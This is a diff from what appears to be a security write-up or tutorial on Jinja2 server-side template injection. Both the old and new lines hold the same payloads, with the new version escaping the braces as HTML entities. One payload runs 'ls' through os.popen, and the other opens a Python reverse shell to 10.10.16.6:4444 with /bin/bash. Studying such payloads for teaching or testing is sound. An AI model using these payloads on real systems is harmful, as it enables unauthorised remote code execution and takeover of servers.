@@ -649,8 +649,8 @@ To reproduce, we will be following those steps:
 
 ```python
 # Calling os.popen without guessing the index of the class
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.6\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+&#123; % for x in ().__class__.__base__.__subclasses__() % &#125;&#123; % if "warning" in x.__name__ % &#125;&#123;&#123; x()._module.__builtins__['__import__']('os').popen("ls").read() &#125;&#125;&#123; %endif% &#125;&#123; % endfor % &#125;
+&#123; % for x in ().__class__.__base__.__subclasses__() % &#125;&#123; % if "warning" in x.__name__ % &#125;&#123;&#123; x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.6\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417) &#125;&#125;&#123; %endif% &#125;&#123; % endfor % &#125;
 ```
 
  `RCE` that opens a `reverse shell` using `jinja2` template payload.  
